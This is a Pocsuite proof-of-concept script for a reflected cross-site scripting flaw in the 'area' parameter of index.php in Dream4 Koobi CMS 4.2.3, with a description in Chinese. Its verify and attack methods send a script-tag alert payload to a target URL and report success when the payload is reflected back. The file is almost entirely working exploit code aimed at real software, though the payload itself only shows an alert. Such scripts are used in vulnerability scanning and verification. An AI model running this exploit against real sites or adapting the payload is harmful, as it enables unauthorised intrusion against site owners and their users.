#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
from urlparse import urljoin

class TestPOC(POCBase):
    vulID = 'SSV-78938'  # vul ID
    version = '1'
    author = 'hzr'
    vulDate = '2005-03-24'
    createDate = '2015-10-26'
    updateDate = '2015-10-26'
    references = ['https://www.exploit-db.com/exploits/25272/','http://www.securityfocus.com/bid/12895/info']
    name = "Dream4 Koobi CMS 4.2.3 Index.PHP Cross-Site Scripting Vulnerability"
    appPowerLink = 'http://www.dream4.de/index.htm'
    appName = 'Dream4 Koobi CMS'
    appVersion = '4.2.3'
    vulType = 'XSS'
    desc = '''
         Dream4 Koobi CMS 4.2.3的index.php中存在跨站脚本攻击(XSS)漏洞，
         远程攻击者可以通过area参数注入任意Web脚本或HTML。
    '''
    # the sample sites for examine
    samples = ['']

    def _verify(self):
        payload = '/index.php?area=<script>alert(/Sebug23333/)</script>'
        res = req.get(urljoin(self.url, payload), timeout=10)
        return self.parse_verify(res, payload, 'xss')

    def parse_verify(self, res, payload, type):
        output = Output(self)
        result = {}
        if  type == 'xss' and '<script>alert(/Sebug23333/)</script>' in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = urljoin(self.url, payload)
            output.success(result)           
        else:
            output.fail('Internet Nothing returned')
        return output

    def _attack(self): 
        return self._verify()

register(TestPOC)